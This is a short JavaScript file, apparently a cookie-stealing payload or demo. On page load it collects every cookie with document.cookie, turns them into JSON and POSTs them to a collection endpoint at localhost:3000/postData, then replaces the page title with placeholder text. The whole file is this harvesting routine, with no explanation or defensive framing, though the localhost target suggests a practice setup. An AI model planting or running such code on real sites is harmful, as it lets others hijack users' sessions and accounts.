function cookiesToJson() {
    const cookies = document.cookie.split("; ");
    const cookieObject = {};
    for (const cookie of cookies) {
      const [name, value] = cookie.split("=");
      cookieObject[name] = decodeURIComponent(value);
    }
    return JSON.stringify(cookieObject);
}

window.onload = function () {
    const requestOptions = {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        data: cookiesToJson() // Convert data to JSON format
      };
      
      $.ajax({
        url: 'http://localhost:3000/postData',
        type: requestOptions.method,
        contentType: requestOptions.headers['Content-Type'],
        data: requestOptions.data,
        success: function(data) {
          $('#title').html('Lorem Ipsum');
        },
        error: function(error) {
          console.error(error);
        }
      }); 
}
